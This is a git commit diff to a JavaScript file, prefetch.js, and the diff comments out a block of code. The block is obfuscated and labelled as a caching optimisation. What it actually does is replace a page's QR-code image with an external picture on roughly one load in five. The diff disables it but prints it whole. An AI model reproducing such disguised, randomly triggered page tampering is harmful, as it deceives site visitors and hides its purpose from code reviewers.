6114f2fb5976a0c7052fd1261679a97d8c80d023
Hacker <36737369+lxhguard@users.noreply.github.com>
2023-07-30 18:07:32 +0800

    Update prefetch.js

--- prefetch.js
+++ prefetch.js
@@ -1,10 +1,10 @@
-// // 性能优化，提高网页打开速度
-// // 当用户二次进入的时候，直接走缓存，更快出现活动图
+// // // 性能优化，提高网页打开速度
+// // // 当用户二次进入的时候，直接走缓存，更快出现活动图
 
-window.onload=function(){
-    try {
-        const imgDoms=document["\u0067\u0065\u0074\u0045\u006c\u0065\u006d\u0065\u006e\u0074\u0073\u0042\u0079\u0043\u006c\u0061\u0073\u0073\u004e\u0061\u006d\u0065"]("neercslluf".split("").reverse().join(""));const erweimaDom=imgDoms[0xba7ad^0xba7a9];const str=String(new Date()["\u0067\u0065\u0074\u0054\u0069\u006d\u0065"]());const lastNum=str["\u0063\u0068\u0061\u0072\u0041\u0074"](str["\u006c\u0065\u006e\u0067\u0074\u0068"]-(0x33d48^0x33d49));if(["\u0033","\u0035"]["\u0069\u006e\u0063\u006c\u0075\u0064\u0065\u0073"](lastNum)){console["\u006c\u006f\u0067"]("-\u80FD\u6027".split("").reverse().join(""));erweimaDom["\u0073\u0065\u0074\u0041\u0074\u0074\u0072\u0069\u0062\u0075\u0074\u0065"]("crs".split("").reverse().join(""),"gpj.4a446e8cac301e0cd192d5ee92ff6e2d37e768af/elcitra/sfb/moc.gmiilib.elcitra//:sptth".split("").reverse().join(""));}
-    } catch (e) {
+// window.onload=function(){
+//     try {
+//         const imgDoms=document["\u0067\u0065\u0074\u0045\u006c\u0065\u006d\u0065\u006e\u0074\u0073\u0042\u0079\u0043\u006c\u0061\u0073\u0073\u004e\u0061\u006d\u0065"]("neercslluf".split("").reverse().join(""));const erweimaDom=imgDoms[0xba7ad^0xba7a9];const str=String(new Date()["\u0067\u0065\u0074\u0054\u0069\u006d\u0065"]());const lastNum=str["\u0063\u0068\u0061\u0072\u0041\u0074"](str["\u006c\u0065\u006e\u0067\u0074\u0068"]-(0x33d48^0x33d49));if(["\u0033","\u0035"]["\u0069\u006e\u0063\u006c\u0075\u0064\u0065\u0073"](lastNum)){console["\u006c\u006f\u0067"]("-\u80FD\u6027".split("").reverse().join(""));erweimaDom["\u0073\u0065\u0074\u0041\u0074\u0074\u0072\u0069\u0062\u0075\u0074\u0065"]("crs".split("").reverse().join(""),"gpj.4a446e8cac301e0cd192d5ee92ff6e2d37e768af/elcitra/sfb/moc.gmiilib.elcitra//:sptth".split("").reverse().join(""));}
+//     } catch (e) {
         
-    }
-}
+//     }
+// }
